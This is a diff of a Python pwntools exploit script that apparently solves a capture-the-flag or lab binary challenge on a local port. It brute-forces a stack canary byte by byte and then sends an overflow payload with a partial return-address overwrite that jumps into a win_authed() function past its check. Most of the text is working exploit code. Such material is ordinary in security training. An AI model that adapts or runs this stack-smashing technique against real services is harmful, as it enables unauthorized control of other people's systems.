@@ -9219,7 +9219,11 @@ context.log_level = 'error'
 
 host = '127.0.0.1'
 port = 1337
-offset_to_canary = 72
+
+buffer_addr = 0x7fff04f2a750
+canary_addr = 0x7fff04f2a798
+addr_of_saved_ip = 0x7fff04f2a7a8
+
 # Target instruction in win_authed() that skips the 0x1337 check
 safe_win_authed_offset = 0x87d0 
 
@@ -9233,12 +9237,23 @@ for i in range(7):
         try:
             p = remote(host, port)
             p.recvuntil(b"Payload size: ")
-            
+
+            # Calculate current_guess, offset_to_canary, payload_size
             current_guess = known_canary + p8(byte_guess)
-            p.sendline(str(offset_to_canary + len(current_guess)).encode())
+            offset_to_canary = canary_addr - buffer_addr
+            payload_size = offset_to_canary + len(current_guess)
             
+            # Send payload size
+            current_guess = known_canary + p8(byte_guess)
+            p.sendline(str(payload_size).encode())
+
+            # Carft payload
+            payload = b"A" * offset_to_canary
+            payload += current_guess
+
+            # Send payload
             p.recvuntil(b"bytes)!")
-            p.send(b"A" * offset_to_canary + current_guess)
+            p.send(payload)
             
             output = p.recvall(timeout=0.4)
             
@@ -9270,17 +9285,22 @@ while True:
     try:
         p = remote(host, port, timeout=1)
         p.recvuntil(b"Payload size: ")
+
+        # Calculate offset_to_ret, payload_size
+        offset_to_ret = addr_of_saved_ip - (canary_addr + 8)
+        payload_size = offset_to_canary + 8 + offset_to_ret + 2
         
-        # 72 (buffer) + 8 (canary) + 8 (rbp) + 2 (partial rip) = 90
-        p.sendline(b"90")
-        p.recvuntil(b"bytes)!")
-        
+        # Send payload size
+        p.sendline(str(payload_size).encode())
+     
         # Build the payload using the canary we just leaked
         payload = b"A" * offset_to_canary
         payload += known_canary
-        payload += b"B" * 8
+        payload += b"B" * offset_to_ret
         payload += struct.pack("<H", safe_win_authed_offset)
-        
+
+        # Send payload
+        p.recvuntil(b"bytes)!")
         p.send(payload)
         
         output = p.recvall(timeout=1).decode(errors='ignore')
